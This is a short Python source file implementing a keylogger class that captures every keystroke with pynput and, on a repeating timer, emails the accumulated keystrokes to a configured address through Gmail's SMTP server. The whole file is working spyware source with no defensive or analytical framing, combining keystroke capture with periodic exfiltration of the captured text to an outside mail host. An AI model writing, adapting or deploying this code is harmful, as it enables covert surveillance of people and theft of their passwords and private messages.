import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self,time,email,password):
        self.stored_keys = " keylogger started .........."
        self.time = time
        self.email = email
        self.password = password
       
    def log(self,string):
        self.stored_keys = self.stored_keys + string

    def keypress(self,key):
        self.stored_keys
        try:
            current_keys = str(key.char)
        except AttributeError:
            if key == key.space:
                current_keys = " "         
            else:
                current_keys =" "+str(key)+" "
        self.log(current_keys)

    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email,self.password,"\n\n"+self.stored_keys)
        self.stored_keys = " "  
        timer = threading.Timer(self.time,self.report)
        timer.start()

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.keypress)
        with listener as key:
            self.report()
            key.join()

